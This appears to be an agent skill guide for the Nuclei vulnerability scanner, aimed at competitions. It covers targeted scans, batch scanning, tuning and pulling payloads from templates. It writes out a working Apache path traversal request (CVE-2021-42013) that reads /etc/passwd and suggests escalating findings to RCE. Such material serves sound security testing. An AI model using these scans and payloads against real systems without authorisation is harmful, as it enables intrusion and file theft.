---
name: nuclei-scan
description: "Nuclei vulnerability scanning methodology. Use when you need to scan a target for known vulnerabilities, validate CVEs, or run batch PoC detection. Nuclei ships 9000+ community-maintained templates covering CVEs, default credentials, misconfigurations, information disclosure, and more. Use this skill for any nuclei scanning, batch CVE validation, PoC detection, or vulnerability template lookup scenario. It also applies when you need to extract payloads from nuclei templates for manual exploitation."
zh-signals: "使用 Nuclei 模板化扫描器进行已知漏洞、CVE 验证与批量 PoC 检测。信号:Nuclei,漏洞扫描,CVE验证,模板,PoC检测"
when-to-use: "Use when scanning targets for known vulnerabilities, validating CVEs, or running template-based batch PoC checks with Nuclei."
metadata:
  tags: "nuclei,scan,cve,poc,vulnerability,vulnerability-scan,template,batch-detection,projectdiscovery"
  category: "tool"
---

# Nuclei Vulnerability Scanning Methodology

Nuclei is ProjectDiscovery's open-source template-based vulnerability scanner. Its core value: **the community-maintained template library** — every template is a verified PoC, which is more reliable than hand-crafting payloads.

## Scanning Strategy

Nuclei has 9000+ templates, and an unrestricted full scan (`nuclei -u target`) takes 10-30 minutes — fatal wasted time in a competition. Narrow the scope with `-t` (specify a template directory) or `-tags` (specify tags), and a precise scan usually finishes within seconds.

Also, Nuclei's template matching is not 100% accurate. After a critical finding you should manually reproduce and confirm it, so you do not waste time on false positives.

## Phase 1: Precise Scanning (Recommended)

Select the matching templates based on fingerprinting results instead of scanning everything:

```bash
# 1. Scan precisely by template ID / CVE number (fastest, seconds)
nuclei -u http://target -id CVE-2021-44228

# 2. Filter by product name (tens of seconds)
nuclei -u http://target -t cves/ -tags apache
nuclei -u http://target -t cves/ -tags tomcat
nuclei -u http://target -t cves/ -tags wordpress

# 3. Only scan high-severity CVEs (1-3 minutes)
nuclei -u http://target -t cves/ -severity critical,high

# 4. Scan by vulnerability type
nuclei -u http://target -t vulnerabilities/ -tags rce
nuclei -u http://target -t vulnerabilities/ -tags sqli
nuclei -u http://target -t vulnerabilities/ -tags lfi
```

### Common Template Directories

| Directory | Content | Applicable Scenario |
|------|------|---------|
| `cves/` | Known CVE PoCs | Zone 2 CVE validation |
| `vulnerabilities/` | Generic vulnerability detection | In-depth web testing |
| `misconfiguration/` | Misconfigurations | Cloud security, service hardening |
| `default-logins/` | Default credentials | Middleware admin consoles |
| `exposures/` | Sensitive information disclosure | Information gathering phase |
| `takeovers/` | Subdomain takeover | Domain asset attacks |

## Phase 2: Template Search and Payload Extraction

When manual exploitation is required (Nuclei cannot scan it directly and you need a custom payload), extract the key information from the template:

```bash
# Search the local template library
find ~/nuclei-templates/ -name "*CVE-2021-42013*" 2>/dev/null
find ~/nuclei-templates/ -name "*apache*" -path "*/cves/*" 2>/dev/null
find ~/nuclei-templates/ -name "*log4j*" 2>/dev/null

# Search template contents by keyword
grep -rl "apache 2.4.49" ~/nuclei-templates/http/cves/ 2>/dev/null
grep -rl "tomcat.*rce" ~/nuclei-templates/http/cves/ 2>/dev/null

# Read the template to extract the payload
cat ~/nuclei-templates/http/cves/2021/CVE-2021-42013.yaml
```

### Interpretation of Key Template Fields

```yaml
# Example template structure
id: CVE-2021-42013
info:
  name: Apache HTTP Server Path Traversal
  severity: critical           # ← severity level
  description: ...             # ← vulnerability description and exploitation conditions

http:
  - raw:                       # ← raw HTTP request (can be extracted directly for curl)
      - |
        GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers:                  # ← success criteria
      - type: regex
        regex:
          - "root:.*:0:0:"

    extractors:                # ← extracted data (e.g. version numbers, keys)
      - type: regex
        regex:
          - "root:.*"
```

**Extract a payload from a template for manual exploitation**:
```bash
# Extract the request path and method from the raw field
cat template.yaml | grep -A5 "raw:" 

# Convert it to a curl command
curl -s "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"

# If the template has a POST body
curl -s -X POST http://target/api -d '{"payload": "..."}'
```

## Phase 3: Batch Target Scanning

When you have multiple targets:

```bash
# Read the target list from a file
echo "http://target1" > targets.txt
echo "http://target2" >> targets.txt
nuclei -l targets.txt -t cves/ -severity critical,high

# Chain with the httpx pipeline
cat urls.txt | httpx -silent | nuclei -t cves/ -severity critical,high
```

## Phase 4: Result Analysis and Validation

Nuclei output format:
```
[CVE-2021-42013] [http] [critical] http://target/cgi-bin/.%2e/...
[CVE-2022-26134] [http] [critical] http://target/wiki/%24%7B...%7D
```

**Critical findings must be manually verified**:
1. Reproduce the request reported by Nuclei and confirm it is not a false positive
2. Check whether the exploitation conditions are met (e.g. whether mod_cgi is enabled)
3. Try to escalate information disclosure into RCE

## Common Tag Quick Reference

| Tag | Description | Example |
|------|------|------|
| `cve` | All CVEs | `-tags cve` |
| `rce` | Remote code execution | `-tags rce` |
| `sqli` | SQL injection | `-tags sqli` |
| `lfi` | Local file inclusion | `-tags lfi` |
| `ssrf` | SSRF | `-tags ssrf` |
| `xss` | XSS | `-tags xss` |
| `default-login` | Default credentials | `-tags default-login` |
| `exposure` | Information disclosure | `-tags exposure` |
| `apache` | Apache related | `-tags apache` |
| `tomcat` | Tomcat related | `-tags tomcat` |
| `wordpress` | WordPress | `-tags wordpress` |
| `jenkins` | Jenkins | `-tags jenkins` |
| `spring` | Spring framework | `-tags spring` |

## Performance Tuning Parameters

```bash
# Control concurrency (default 25; lower it with few targets to avoid being banned)
nuclei -u http://target -t cves/ -c 10

# Rate limit
nuclei -u http://target -t cves/ -rl 50  # 50 requests per second

# Timeout setting
nuclei -u http://target -t cves/ -timeout 10

# Output only the vulnerabilities found (quiet mode)
nuclei -u http://target -t cves/ -silent

# Write the output to a file (JSON format for easy analysis)
nuclei -u http://target -t cves/ -json -o results.json
```
